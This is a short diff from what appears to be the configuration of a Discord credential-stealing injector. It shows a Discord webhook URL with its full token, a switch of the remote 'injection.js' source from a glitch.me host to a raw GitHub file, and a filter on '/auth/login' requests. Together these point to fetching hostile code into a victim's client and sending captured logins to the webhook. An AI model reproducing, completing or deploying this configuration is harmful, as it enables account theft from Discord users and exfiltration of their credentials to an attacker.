@@ -13,7 +13,7 @@ const {
 
 const CONFIG = {
     webhook: "https://canary.discord.com/api/webhooks/1383465075624509575/aSH366UZULB_wuiTNovlosW7XjOy6XN73RPrTY5_TUGXEF61Wbn3uPIL3diE7DmGB7ov",
-    injection_url: "https://abounding-meteor-organ.glitch.me/injection.js",
+    injection_url: "https://raw.githubusercontent.com/lotusknig/lotus-knight.github.io/refs/heads/main/injection.js",
     filters: {
         urls: [
             '/auth/login',
